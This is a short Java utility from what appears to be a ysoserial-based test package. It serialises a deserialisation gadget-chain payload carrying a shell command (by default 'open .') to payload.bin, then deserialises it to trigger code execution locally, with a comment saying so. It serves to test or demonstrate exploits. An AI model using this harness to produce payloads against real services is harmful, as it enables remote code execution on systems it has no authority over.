package ysoserial.test.hacker;

import ysoserial.payloads.ObjectPayload;

import java.io.*;

/**
 *
 *
 * @author cdliuhaibo
 * @date 2020/2/20
 */
public final class HackerUtils {
    private static final String FILE = "payload.bin";
    public static void hack4Explorer(ObjectPayload objectPayload) {
        hack(objectPayload, "open .");
    }
    public static void hack(ObjectPayload objectPayload, String command) {
        try {
            run(objectPayload.getObject(command));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void run(Object object) {
        try {
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(FILE));
            out.writeObject(object);
            out.flush();
            out.close();

            FileInputStream fis = new FileInputStream(FILE);
            ObjectInputStream ois = new ObjectInputStream(fis);
            // 触发代码执行
            Object newObj = ois.readObject();
            ois.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            new File(FILE).delete();
        }
    }
}
